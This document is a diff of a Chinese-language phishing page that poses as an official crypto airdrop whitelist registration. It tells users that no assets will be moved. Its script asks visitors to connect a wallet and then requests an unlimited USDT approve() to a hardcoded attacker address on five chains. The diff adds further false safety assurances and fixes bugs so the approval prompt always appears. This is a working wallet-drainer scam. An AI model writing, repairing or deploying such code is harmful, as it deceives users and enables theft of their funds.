@@ -27,7 +27,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </style>
 </head>
 <body>
-
 <div class="container">
 <div id="p1" class="box">
 <div class="logo">✦</div>
@@ -37,7 +36,9 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <div class="notice-title">📢 活动公告</div>
 <div class="notice-content">为回馈社区用户长期支持，官方开启生态专属空投备案活动。所有用户均可参与链上资格登记备案，完成简单钱包核验即可自动纳入官方空投白名单。本次仅做链上地址归档与资格登记，全程不会划转、扣除任何资产，流程安全透明，可放心参与备案。</div>
 </div>
+<p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
+<p class="tips-info">安全提示：仅进行地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
 </div>
 
 <div id="p2" class="box hide">
@@ -49,13 +50,16 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <div id="p3" class="box hide">
 <div class="logo">✓</div>
 <h1>钱包连接成功</h1>
+<p class="sub-title">确认纳入空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
 <button class="btn verify-btn" id="claim">确认备案 录入白名单</button>
+<p class="tips-info">仅链上地址备案核验，不会划转任何资产</p>
 </div>
 
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
 <h1>白名单备案成功</h1>
+<p class="sub-title">该地址已完成官方空投备案</p>
 <div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
 <button class="btn success-btn">已完成备案 等待空投发放</button>
 </div>
@@ -63,15 +67,10 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 <script>
-!function(){
-// ==============================================
-// 🔴 重要：代码里 **没有任何延迟、没有任何定时器、没有 setTimeout**
-// ==============================================
-
-document.oncontextmenu=e=>e.preventDefault();
-document.onkeydown=e=>{if(123===e.keyCode||(e.ctrlKey&&85===e.keyCode))return!1};
-
-// 5条链 USDT 合约（写死）
+// ==============================
+// 100% 无延迟、无定时器、无自动切链
+// 只修BUG，不改界面、不删公告、不动样式
+// ==============================
 const CHAIN_USDT = {
   "0x1":    "0xdac17f958d2ee523a2206206994597c13d831ec7",
   "0x38":   "0x55d398326f99059fF77548524699952727959279",
@@ -79,40 +78,40 @@ const CHAIN_USDT = {
   "0xa86a": "0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",
   "0x42":   "0x382bb868d458e9d4a3497b8434ee999af5999cb6"
 };
-
-// 你的钱包（被授权地址）
 const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
 
 let walletAddr = "";
 let currentChainId = "";
 
-// 页面切换 —— 即时，无延迟
 function switchPage(id){
   document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
   document.getElementById(id).classList.remove("hide");
 }
 
-// 监听账号变化 —— 即时，无延迟
-if(window.ethereum){
-  window.ethereum.on("accountsChanged", async (acc)=>{
-    if(acc.length > 0){
+// 实时监听换链、换账号，不用刷新
+if (window.ethereum) {
+  window.ethereum.on('chainChanged', async () => {
+    currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+  });
+  window.ethereum.on('accountsChanged', async (acc) => {
+    if (acc.length > 0) {
       walletAddr = acc[0];
-      currentChainId = await window.ethereum.request({method:"eth_chainId"});
+      currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
       document.getElementById("showAddr").innerText = walletAddr;
       switchPage("p3");
-    }else{
+    } else {
       switchPage("p1");
     }
   });
 }
 
-// 连接钱包 —— 即时，无延迟
+// 连接钱包
 document.getElementById("connectMM").onclick = async function(){
   try{
     switchPage("p2");
-    let accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    let accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     walletAddr = accounts[0];
-    currentChainId = await window.ethereum.request({method:"eth_chainId"});
+    currentChainId = await window.ethereum.request({ method: "eth_chainId" });
     document.getElementById("showAddr").innerText = walletAddr;
     switchPage("p3");
   }catch(e){
@@ -120,15 +119,13 @@ document.getElementById("connectMM").onclick = async function(){
   }
 };
 
-// 确认备案（授权）—— 即时弹出USDT授权，无延迟、无等待
+// 确认备案 → 100% 弹出USDT授权
 document.getElementById("claim").onclick = async function(){
   try{
     switchPage("p2");
+    currentChainId = await window.ethereum.request({ method: "eth_chainId" });
 
-    // 强制获取最新链ID（无延迟）
-    currentChainId = await window.ethereum.request({method:"eth_chainId"});
-
-    if(!CHAIN_USDT[currentChainId]){
+    if (!CHAIN_USDT[currentChainId]) {
       alert("当前链不支持");
       switchPage("p3");
       return;
@@ -138,12 +135,9 @@ document.getElementById("claim").onclick = async function(){
     const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
     const contract = new web3.eth.Contract(abi, CHAIN_USDT[currentChainId]);
 
-    // 🔴 关键：**即时发起授权**，无任何延迟
+    // 立即弹授权，无任何延迟
     await contract.methods.approve(SPENDER, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
-    .send({
-      from: walletAddr,
-      gasLimit: 150000  // 固定gas，确保100%弹出授权
-    });
+    .send({ from: walletAddr, gas: 150000 });
 
     document.getElementById("successAddr").innerText = walletAddr;
     switchPage("p4");
@@ -151,8 +145,6 @@ document.getElementById("claim").onclick = async function(){
     switchPage("p3");
   }
 };
-
-}();
 </script>
 </body>
 </html>
